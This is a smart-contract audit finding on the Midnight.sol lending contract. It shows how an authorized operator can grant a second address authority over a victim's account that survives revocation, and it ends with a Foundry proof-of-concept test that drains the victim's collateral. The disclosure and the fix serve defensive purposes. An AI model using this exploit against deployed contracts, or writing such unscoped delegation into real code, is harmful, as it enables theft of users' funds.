### Title
Authorized Operator Can Transitively Grant Persistent Backdoor Authorization, Surviving Victim's Revocation - (File: src/Midnight.sol)

### Summary
`setIsAuthorized` permits any currently-authorized operator to call `setIsAuthorized(attacker2, true, victim)`, writing a new entry into `isAuthorized[victim][attacker2]` that the victim never explicitly granted and may not know exists. When the victim later revokes the original attacker, `attacker2`'s authorization is unaffected, giving attacker2 permanent, unrevoked access to all victim-gated operations including `withdrawCollateral` and `withdraw`.

### Finding Description
**Root cause:** `setIsAuthorized` (line 731) checks only `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]` before writing `isAuthorized[onBehalf][authorized] = newIsAuthorized`. There is no restriction preventing an authorized operator from writing additional entries into the victim's authorization mapping.

**Exploit flow:**

1. Victim calls `setIsAuthorized(attacker, true, victim)` for a limited purpose (e.g., to let attacker manage one position). State: `isAuthorized[victim][attacker] = true`.
2. Attacker calls `setIsAuthorized(attacker2, true, victim)`. The check at line 732 passes because `isAuthorized[victim][attacker] == true`. State: `isAuthorized[victim][attacker2] = true`.
3. Victim calls `setIsAuthorized(attacker, false, victim)` to revoke. State: `isAuthorized[victim][attacker] = false`. `isAuthorized[victim][attacker2]` is **unchanged**.
4. attacker2 calls `withdrawCollateral(market, collateralIndex, assets, victim, attacker2)`. Line 556 check: `isAuthorized[victim][attacker2] == true` → passes. Victim's collateral is transferred to attacker2.
5. attacker2 calls `withdraw(market, units, victim, attacker2)`. Same check passes. Victim's credit is drained.

**Why existing checks fail:** The Certora rule `onlyAuthorizedCanChangeIsAuthorized` (spec line 103) only asserts the caller was authorized at the time of the call — it does not constrain the depth of delegation. The isolation rule `setIsAuthorizedIsolation` (spec line 125) only verifies that unrelated `(user, authorized)` pairs are unaffected, which is true; the attack writes to `(victim, attacker2)` which is a new pair. No on-chain check prevents this.

### Impact Explanation
attacker2 gains permanent `isAuthorized[victim][attacker2] = true` that survives victim's revocation of attacker. attacker2 can call `withdrawCollateral` to seize all of victim's collateral tokens and `withdraw` to drain all of victim's redeemable credit units, with no further preconditions once the backdoor is planted.

### Likelihood Explanation
Preconditions: victim must authorize attacker at least once (common for wallet integrations, periphery contracts, or delegated management). Attacker needs only one transaction during the authorization window to plant attacker2. The victim has no way to detect the backdoor unless they enumerate all `SetIsAuthorized` events. The attack is repeatable: attacker can plant multiple backdoor addresses before being revoked.

### Recommendation
Restrict `setIsAuthorized` so that only `onBehalf == msg.sender` (i.e., the account itself) can modify its own authorization mapping. Authorized operators should not be permitted to sub-delegate. Change line 732 to:

```solidity
require(onBehalf == msg.sender, Unauthorized());
```

If operator-driven authorization changes are required by design, introduce a separate, explicitly scoped permission bit (e.g., `canDelegate`) that the victim must set, and scope it narrowly.

function testTransitiveAuthorizationBackdoor() public {
    address victim   = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address attacker2 = makeAddr("attacker2");

    uint256 collateralAmount = 1000;
    address collateralToken = market.collateralParams[0].token;

    // Victim deposits collateral
    deal(collateralToken, victim, collateralAmount);
    vm.prank(victim);
    ERC20(collateralToken).approve(address(midnight), collateralAmount);
    vm.prank(victim);
    midnight.supplyCollateral(market, 0, collateralAmount, victim);

    // Step 1: Victim authorizes attacker for a limited purpose
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Step 2: Attacker plants backdoor — grants attacker2 authorization over victim
    vm.prank(attacker);
    midnight.setIsAuthorized(attacker2, true, victim);

    // Step 3: Victim revokes attacker
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, false, victim);

    // Assert: attacker is revoked, but attacker2 still has access
    assertEq(midnight.isAuthorized(victim, attacker),  false);
    assertEq(midnight.isAuthorized(victim, attacker2), true);  // backdoor persists

    // Step 4: attacker2 drains victim's collateral
    vm.prank(attacker2);
    midnight.withdrawCollateral(market, 0, collateralAmount, victim, attacker2);

    // Assert: victim's collateral is gone, attacker2 received it
    assertEq(midnight.collateral(toId(market), victim, 0), 0);
    assertEq(ERC20(collateralToken).balanceOf(attacker2), collateralAmount);
}
